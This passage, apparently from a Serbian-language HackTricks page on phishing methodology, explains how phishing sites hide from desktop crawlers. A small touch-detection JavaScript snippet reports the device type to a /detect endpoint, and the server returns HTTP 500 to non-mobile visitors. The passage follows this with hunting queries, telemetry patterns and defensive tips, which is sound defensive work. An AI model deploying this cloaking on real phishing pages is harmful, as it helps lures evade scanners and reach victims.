* Napadač odmah dobija vidljivost nad chat/contact dok session ne bude uklonjen. Žrtve kasnije mogu videti obaveštenje o “new device linked”; defanzivci mogu tražiti neočekivane device-link događaje neposredno nakon poseta nepouzdanim QR stranicama.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatori sve češće gate-uju svoje phishing tokove iza jednostavne device provere kako desktop crawleri nikada ne bi stigli do finalnih stranica. Uobičajen obrazac je mali script koji testira DOM sa touch podrškom i prosleđuje rezultat server endpoint-u; non‑mobile klijenti dobijaju HTTP 500 (ili blank page), dok mobile korisnici dobijaju puni flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Ponašanje servera koje se često primećuje:
- Postavlja session cookie tokom prvog učitavanja.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) na naredne GET zahteve kada je `is_mobile=false`; prikazuje phishing samo ako je `true`.

Heuristike za hunting i detekciju:
- urlscan upit: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: niz `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non-mobile; legitimne mobile žrtve vraćaju 200 sa naknadnim HTML/JS.
- Blokirati ili detaljno proveravati stranice koje uslovljavaju sadržaj isključivo na `ontouchstart` ili sličnim device proverama.

Saveti za odbranu:
- Pokretati crawlers sa mobile-like fingerprint-ovima i omogućenim JS-om da bi se otkrio gated sadržaj.
- Aktivirati alert na sumnjive 500 odgovore nakon `POST /detect` na novo registrovanim domenima.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
